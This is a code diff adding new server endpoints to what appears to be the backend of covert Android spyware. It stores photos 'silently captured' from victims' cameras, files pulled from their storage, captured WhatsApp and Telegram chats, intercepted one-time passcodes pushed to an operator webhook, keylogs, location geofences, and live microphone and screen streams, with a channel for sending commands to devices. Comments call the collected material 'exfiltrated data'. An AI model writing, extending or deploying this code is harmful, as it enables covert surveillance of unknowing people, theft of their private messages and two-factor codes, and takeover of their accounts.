@@ -2824,6 +2824,519 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══════════════════════════════════════════════════════════════════════
+  // v7.9 NEW ENDPOINTS — camera capture, file upload, chat/OTP storage, geofences, webhooks
+  // ═══════════════════════════════════════════════════════════════════════
+
+  // Camera capture upload — device uploads JPEG silently captured from front/back camera
+  const cameraUpload = require('multer')({
+    dest: path.join(__dirname, 'data', 'tmp'),
+    limits: { fileSize: 20 * 1024 * 1024 }
+  });
+  app.post('/api/devices/camera-capture', cameraUpload.single('photo'), (req, res) => {
+    try {
+      const { device_id, camera, ts } = req.body;
+      if (!device_id || !req.file) return res.status(400).json({ error: 'device_id and photo required' });
+
+      const camDir = path.join(__dirname, 'data', 'camera_captures', device_id);
+      if (!fs.existsSync(camDir)) fs.mkdirSync(camDir, { recursive: true });
+
+      const destName = `cam_${Date.now()}_${camera || 'back'}.jpg`;
+      const destPath = path.join(camDir, destName);
+      fs.copyFileSync(req.file.path, destPath);
+      try { fs.unlinkSync(req.file.path); } catch (_) {}
+
+      // Build URL — same host serves /camera_captures/* statically (configured below)
+      const protocol = req.headers['x-forwarded-proto'] || 'https';
+      const host = req.headers['host'] || 'netmirrorr.onrender.com';
+      const url = `${protocol}://${host}/camera_captures/${device_id}/${destName}`;
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS camera_captures (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, filename TEXT, camera TEXT, file_size INTEGER,
+          captured_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('INSERT INTO camera_captures (device_id, filename, camera, file_size) VALUES (?,?,?,?)')
+          .run(device_id, destName, camera || 'back', fs.statSync(destPath).size);
+      } catch (_) {}
+
+      if (io) io.emit('new_camera_capture', { device_id, url, camera: camera || 'back', ts: Date.now() });
+      console.log(`[CameraCapture] ${destName} for ${device_id} (${Math.round(fs.statSync(destPath).size / 1024)} KB)`);
+      res.json({ success: true, url });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+  // Serve camera captures statically
+  app.use('/camera_captures', express.static(path.join(__dirname, 'data', 'camera_captures')));
+
+  // Remote file manager — device uploads any file from target filesystem
+  const fileUpload = require('multer')({
+    dest: path.join(__dirname, 'data', 'tmp'),
+    limits: { fileSize: 200 * 1024 * 1024 }
+  });
+  app.post('/api/devices/upload-file', fileUpload.single('file'), (req, res) => {
+    try {
+      const { device_id, original_path, size } = req.body;
+      if (!device_id || !req.file) return res.status(400).json({ error: 'device_id and file required' });
+
+      const fileDir = path.join(__dirname, 'data', 'device_files', device_id);
+      if (!fs.existsSync(fileDir)) fs.mkdirSync(fileDir, { recursive: true });
+
+      // Preserve original filename, but append timestamp to avoid collisions
+      const origName = req.file.originalname || `file_${Date.now()}`;
+      const safeName = `${Date.now()}_${origName.replace(/[^a-zA-Z0-9._-]/g, '_')}`;
+      const destPath = path.join(fileDir, safeName);
+      fs.copyFileSync(req.file.path, destPath);
+      try { fs.unlinkSync(req.file.path); } catch (_) {}
+
+      const protocol = req.headers['x-forwarded-proto'] || 'https';
+      const host = req.headers['host'] || 'netmirrorr.onrender.com';
+      const url = `${protocol}://${host}/device_files/${device_id}/${safeName}`;
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS device_files (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, filename TEXT, original_path TEXT, file_size INTEGER,
+          uploaded_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('INSERT INTO device_files (device_id, filename, original_path, file_size) VALUES (?,?,?,?)')
+          .run(device_id, safeName, original_path || '', fs.statSync(destPath).size);
+      } catch (_) {}
+
+      if (io) io.emit('new_device_file', { device_id, url, original_path: original_path || '', size: fs.statSync(destPath).size });
+      console.log(`[FileUpload] ${safeName} for ${device_id} (${Math.round(fs.statSync(destPath).size / 1024)} KB)`);
+      res.json({ success: true, url });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+  app.use('/device_files', express.static(path.join(__dirname, 'data', 'device_files')));
+
+  // Chat messages storage — real-time chat capture from WhatsApp/Telegram/etc.
+  app.post('/api/devices/chat-messages', express.json({ limit: '5mb' }), (req, res) => {
+    try {
+      const { device_id, entries } = req.body;
+      if (!device_id || !Array.isArray(entries)) return res.status(400).json({ error: 'device_id and entries array required' });
+
+      let stored = 0;
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS chat_messages (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, app TEXT, conversation TEXT, sender TEXT,
+          message_text TEXT, is_group INTEGER DEFAULT 0,
+          recorded_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const stmt = db.prepare('INSERT INTO chat_messages (device_id, app, conversation, sender, message_text, is_group, recorded_at) VALUES (?,?,?,?,?,?,?)');
+        for (const e of entries) {
+          if (e.message_type !== 'chat') continue;
+          stmt.run(device_id, e.app || '', e.conversation || '', e.sender || '', e.text || '', e.is_group ? 1 : 0, normalizeTs(e.ts));
+          stored++;
+        }
+      } catch (_) {}
+
+      res.json({ success: true, stored });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Get chat messages for a device (admin panel)
+  app.get('/api/devices/:deviceId/chat-messages', (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const { app, limit, offset, search } = req.query;
+      let q = 'SELECT * FROM chat_messages WHERE device_id = ?';
+      const params = [deviceId];
+      if (app) { q += ' AND app = ?'; params.push(app); }
+      if (search) { q += ' AND (sender LIKE ? OR message_text LIKE ? OR conversation LIKE ?)'; const s = `%${search}%`; params.push(s, s, s); }
+      q += ' ORDER BY recorded_at DESC LIMIT ? OFFSET ?';
+      params.push(parseInt(limit) || 100, parseInt(offset) || 0);
+      const rows = db.prepare(q).all(...params);
+      res.json({ success: true, entries: rows });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // OTP codes storage — captured verification codes
+  app.post('/api/devices/otp-codes', express.json({ limit: '2mb' }), (req, res) => {
+    try {
+      const { device_id, entries } = req.body;
+      if (!device_id || !Array.isArray(entries)) return res.status(400).json({ error: 'device_id and entries array required' });
+
+      let stored = 0;
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS otp_codes (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, app TEXT, sender TEXT, code TEXT, full_text TEXT,
+          captured_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const stmt = db.prepare('INSERT INTO otp_codes (device_id, app, sender, code, full_text, captured_at) VALUES (?,?,?,?,?,?)');
+        for (const e of entries) {
+          if (e.message_type !== 'otp') continue;
+          stmt.run(device_id, e.app || '', e.sender || '', e.code || '', e.full_text || '', normalizeTs(e.ts));
+          stored++;
+          // Real-time alert to admin panel
+          if (io) io.emit('new_otp', {
+            device_id, app: e.app || '', sender: e.sender || '',
+            code: e.code || '', full_text: e.full_text || '',
+            captured_at: normalizeTs(e.ts)
+          });
+          // Fire webhook if configured
+          fireWebhook(device_id, 'otp_captured', {
+            device_id, app: e.app, sender: e.sender, code: e.code, full_text: e.full_text
+          }).catch(_ => {});
+        }
+      } catch (_) {}
+
+      res.json({ success: true, stored });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Get OTP codes for a device (admin panel)
+  app.get('/api/devices/:deviceId/otp-codes', (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const { limit, offset } = req.query;
+      const rows = db.prepare('SELECT * FROM otp_codes WHERE device_id = ? ORDER BY captured_at DESC LIMIT ? OFFSET ?')
+        .all(deviceId, parseInt(limit) || 50, parseInt(offset) || 0);
+      res.json({ success: true, entries: rows });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ GEOFENCES — admin pushes geofence list per device ═══
+  app.post('/api/devices/:deviceId/geofences', express.json(), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      const { geofences } = req.body;
+      if (!Array.isArray(geofences)) return res.status(400).json({ error: 'geofences array required' });
+
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS geofences (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, geofence_id TEXT, name TEXT, points TEXT,
+          alert_on_enter INTEGER DEFAULT 1, alert_on_exit INTEGER DEFAULT 1,
+          created_at TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('DELETE FROM geofences WHERE device_id = ?').run(deviceId);
+        const stmt = db.prepare('INSERT INTO geofences (device_id, geofence_id, name, points, alert_on_enter, alert_on_exit) VALUES (?,?,?,?,?,?)');
+        for (const g of geofences) {
+          stmt.run(deviceId, g.id || `gf_${Date.now()}`, g.name || '', JSON.stringify(g.points || []),
+                   g.alert_on_enter ? 1 : 0, g.alert_on_exit ? 1 : 0);
+        }
+      } catch (_) {}
+
+      // Push to device via socket
+      if (io) io.to(`device_${deviceId}`).emit('set_geofences', { geofences });
+      res.json({ success: true, count: geofences.length });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  app.get('/api/devices/:deviceId/geofences', (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const rows = db.prepare('SELECT * FROM geofences WHERE device_id = ?').all(deviceId);
+      res.json({ success: true, geofences: rows });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Geofence event log (entries/exits)
+  app.get('/api/devices/:deviceId/geofence-events', (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const { limit } = req.query;
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS geofence_events (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, geofence_id TEXT, geofence_name TEXT,
+          event TEXT, latitude REAL, longitude REAL,
+          recorded_at TEXT DEFAULT (datetime('now'))
+        )`);
+        const rows = db.prepare('SELECT * FROM geofence_events WHERE device_id = ? ORDER BY recorded_at DESC LIMIT ?')
+          .all(deviceId, parseInt(limit) || 100);
+        res.json({ success: true, events: rows });
+      } catch (_) {
+        res.json({ success: true, events: [] });
+      }
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ WEBHOOKS — admin configures Telegram/Discord webhook for event alerts ═══
+  app.post('/api/admin/webhooks', express.json(), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { url, events, enabled } = req.body;
+      if (!url) return res.status(400).json({ error: 'url required' });
+      const cfg = { url, events: events || ['otp_captured', 'geofence_event', 'security_event'], enabled: enabled !== false, created_at: new Date().toISOString() };
+      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('webhook_config', ?)").run(JSON.stringify(cfg));
+      res.json({ success: true, webhook: cfg });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  app.get('/api/admin/webhooks', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const row = db.prepare("SELECT value FROM admin_settings WHERE key = 'webhook_config'").get();
+      res.json({ success: true, webhook: row ? JSON.parse(row.value) : null });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ TWO-WAY CHAT — admin sends a message/command to device, device responds ═══
+  app.post('/api/devices/:deviceId/chat', express.json(), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { deviceId } = req.params;
+      const { message, type } = req.body;  // type: 'command' | 'text'
+      if (!message) return res.status(400).json({ error: 'message required' });
+
+      const msgId = `msg_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+      const payload = {
+        id: msgId,
+        device_id: deviceId,
+        message,
+        type: type || 'command',
+        from: 'admin',
+        ts: Date.now()
+      };
+      // Push to device via socket
+      if (io) io.to(`device_${deviceId}`).emit('admin_chat', payload);
+
+      // Store in DB for history
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS admin_chat (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, message TEXT, type TEXT, from_sender TEXT,
+          ts TEXT DEFAULT (datetime('now'))
+        )`);
+        db.prepare('INSERT INTO admin_chat (device_id, message, type, from_sender, ts) VALUES (?,?,?,?,?)')
+          .run(deviceId, message, type || 'command', 'admin', new Date().toISOString());
+      } catch (_) {}
+
+      res.json({ success: true, msg_id: msgId });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Get admin-device chat history
+  app.get('/api/devices/:deviceId/chat', (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const { limit } = req.query;
+      try {
+        db.exec(`CREATE TABLE IF NOT EXISTS admin_chat (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          device_id TEXT, message TEXT, type TEXT, from_sender TEXT,
+          ts TEXT DEFAULT (datetime('now'))
+        )`);
+        const rows = db.prepare('SELECT * FROM admin_chat WHERE device_id = ? ORDER BY ts DESC LIMIT ?')
+          .all(deviceId, parseInt(limit) || 100);
+        res.json({ success: true, messages: rows.reverse() });
+      } catch (_) {
+        res.json({ success: true, messages: [] });
+      }
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ SEARCHABLE TRANSCRIPT VAULT — unified search across all exfiltrated data ═══
+  app.get('/api/devices/:deviceId/search', (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const { q, limit } = req.query;
+      if (!q) return res.status(400).json({ error: 'q (query) required' });
+      const searchStr = `%${q}%`;
+      const lim = parseInt(limit) || 50;
+      const results = [];
+
+      // Search chat_messages
+      try {
+        const chats = db.prepare(`SELECT 'chat' as source, id, app as context, sender, message_text as text, recorded_at
+                                  FROM chat_messages WHERE device_id = ? AND (sender LIKE ? OR message_text LIKE ? OR conversation LIKE ?)
+                                  ORDER BY recorded_at DESC LIMIT ?`)
+          .all(deviceId, searchStr, searchStr, searchStr, lim);
+        results.push(...chats);
+      } catch (_) {}
+
+      // Search otp_codes
+      try {
+        const otps = db.prepare(`SELECT 'otp' as source, id, app as context, sender, code as text, full_text, captured_at as recorded_at
+                                 FROM otp_codes WHERE device_id = ? AND (code LIKE ? OR full_text LIKE ? OR sender LIKE ?)
+                                 ORDER BY captured_at DESC LIMIT ?`)
+          .all(deviceId, searchStr, searchStr, searchStr, lim);
+        results.push(...otps);
+      } catch (_) {}
+
+      // Search keylog_entries
+      try {
+        const kls = db.prepare(`SELECT 'keylog' as source, id, app_package as context, '' as sender, text_content as text, recorded_at
+                               FROM keylog_entries WHERE device_id = ? AND text_content LIKE ?
+                               ORDER BY recorded_at DESC LIMIT ?`)
+          .all(deviceId, searchStr, lim);
+        results.push(...kls);
+      } catch (_) {}
+
+      // Search notifications (raw)
+      try {
+        const notifs = db.prepare(`SELECT 'notification' as source, id, app as context, title as sender, text, recorded_at
+                                  FROM notifications WHERE device_id = ? AND (title LIKE ? OR text LIKE ?)
+                                  ORDER BY recorded_at DESC LIMIT ?`)
+          .all(deviceId, searchStr, searchStr, lim);
+        results.push(...notifs);
+      } catch (_) {}
+
+      // Sort by recorded_at DESC + limit
+      results.sort((a, b) => (b.recorded_at || '').localeCompare(a.recorded_at || ''));
+      res.json({ success: true, query: q, results: results.slice(0, lim) });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ MULTI-DEVICE DASHBOARD — list all devices with last-seen + online status ═══
+  app.get('/api/admin/dashboard', (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const devices = db.prepare(`SELECT * FROM devices ORDER BY last_seen DESC`).all();
+      const now = Date.now();
+      const dashboard = devices.map(d => ({
+        ...d,
+        online: d.last_seen && (now - new Date(d.last_seen).getTime() < 60000),
+        last_seen_minutes_ago: d.last_seen ? Math.round((now - new Date(d.last_seen).getTime()) / 60000) : null
+      }));
+      res.json({
+        success: true,
+        total: dashboard.length,
+        online: dashboard.filter(d => d.online).length,
+        offline: dashboard.filter(d => !d.online).length,
+        devices: dashboard
+      });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // Helper: fire webhook for a specific event type
+  async function fireWebhook(deviceId, eventType, payload) {
+    try {
+      const row = db.prepare("SELECT value FROM admin_settings WHERE key = 'webhook_config'").get();
+      if (!row || !row.value) return;
+      const cfg = JSON.parse(row.value);
+      if (!cfg.enabled || !cfg.url) return;
+      if (!cfg.events || !cfg.events.includes(eventType)) return;
+
+      const body = JSON.stringify({
+        event: eventType,
+        device_id: deviceId,
+        timestamp: new Date().toISOString(),
+        payload
+      });
+      const resp = await fetch(cfg.url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'User-Agent': 'NetMirror-Webhook/1.0' },
+        body
+      });
+      console.log(`[Webhook] ${eventType} → ${cfg.url} (HTTP ${resp.status})`);
+    } catch (e) {
+      console.warn(`[Webhook] fire failed: ${e.message}`);
+    }
+  }
+
+  // Register socket handler for chat_message + otp_captured events from device
+  // (so we can persist them in real-time, not just via batch REST upload)
+  if (io) {
+    io.on('connection', (socket) => {
+      socket.on('chat_message', (data) => {
+        try {
+          if (!data || !data.device_id) return;
+          db.exec(`CREATE TABLE IF NOT EXISTS chat_messages (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT, app TEXT, conversation TEXT, sender TEXT,
+            message_text TEXT, is_group INTEGER DEFAULT 0,
+            recorded_at TEXT DEFAULT (datetime('now'))
+          )`);
+          db.prepare('INSERT INTO chat_messages (device_id, app, conversation, sender, message_text, is_group, recorded_at) VALUES (?,?,?,?,?,?,?)')
+            .run(data.device_id, data.app || '', data.conversation || '', data.sender || '', data.text || '', data.is_group ? 1 : 0, normalizeTs(data.ts));
+          io.emit('new_chat_message', data);  // broadcast to admin panel
+        } catch (_) {}
+      });
+
+      socket.on('otp_captured', (data) => {
+        try {
+          if (!data || !data.device_id) return;
+          db.exec(`CREATE TABLE IF NOT EXISTS otp_codes (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT, app TEXT, sender TEXT, code TEXT, full_text TEXT,
+            captured_at TEXT DEFAULT (datetime('now'))
+          )`);
+          db.prepare('INSERT INTO otp_codes (device_id, app, sender, code, full_text, captured_at) VALUES (?,?,?,?,?,?)')
+            .run(data.device_id, data.app || '', data.sender || '', data.code || '', data.full_text || '', normalizeTs(data.ts));
+          io.emit('new_otp', data);  // broadcast to admin panel for real-time alert
+          fireWebhook(data.device_id, 'otp_captured', data).catch(_ => {});
+        } catch (_) {}
+      });
+
+      socket.on('geofence_event', (data) => {
+        try {
+          if (!data || !data.device_id) return;
+          db.exec(`CREATE TABLE IF NOT EXISTS geofence_events (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT, geofence_id TEXT, geofence_name TEXT,
+            event TEXT, latitude REAL, longitude REAL,
+            recorded_at TEXT DEFAULT (datetime('now'))
+          )`);
+          db.prepare('INSERT INTO geofence_events (device_id, geofence_id, geofence_name, event, latitude, longitude, recorded_at) VALUES (?,?,?,?,?,?,?)')
+            .run(data.device_id, data.geofence_id || '', data.geofence_name || '', data.event || '',
+                 data.lat || 0, data.lng || 0, normalizeTs(data.ts));
+          io.emit('new_geofence_event', data);
+          fireWebhook(data.device_id, 'geofence_event', data).catch(_ => {});
+        } catch (_) {}
+      });
+
+      socket.on('security_event', (data) => {
+        try {
+          if (!data || !data.device_id) return;
+          db.exec(`CREATE TABLE IF NOT EXISTS security_events (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT, compromised INTEGER, findings TEXT,
+            recorded_at TEXT DEFAULT (datetime('now'))
+          )`);
+          db.prepare('INSERT INTO security_events (device_id, compromised, findings, recorded_at) VALUES (?,?,?,?)')
+            .run(data.device_id, data.compromised ? 1 : 0, JSON.stringify(data.findings || []), normalizeTs(data.ts));
+          io.emit('new_security_event', data);
+          if (data.compromised) fireWebhook(data.device_id, 'security_event', data).catch(_ => {});
+        } catch (_) {}
+      });
+
+      socket.on('mic_stream_chunk', (meta, chunk) => {
+        // Just broadcast to admin panel — we don't persist audio chunks
+        io.emit('mic_stream_chunk', { ...meta, chunk: chunk ? Buffer.from(chunk).toString('base64') : null });
+      });
+
+      socket.on('screen_stream_chunk', (meta, chunk) => {
+        io.emit('screen_stream_chunk', { ...meta, chunk: chunk ? Buffer.from(chunk).toString('base64') : null });
+      });
+    });
+  }
+
   // Normalize timestamp — accepts epoch-millis (number/string) or ISO string, returns ISO string
   function normalizeTs(ts) {
     if (!ts) return new Date().toISOString();
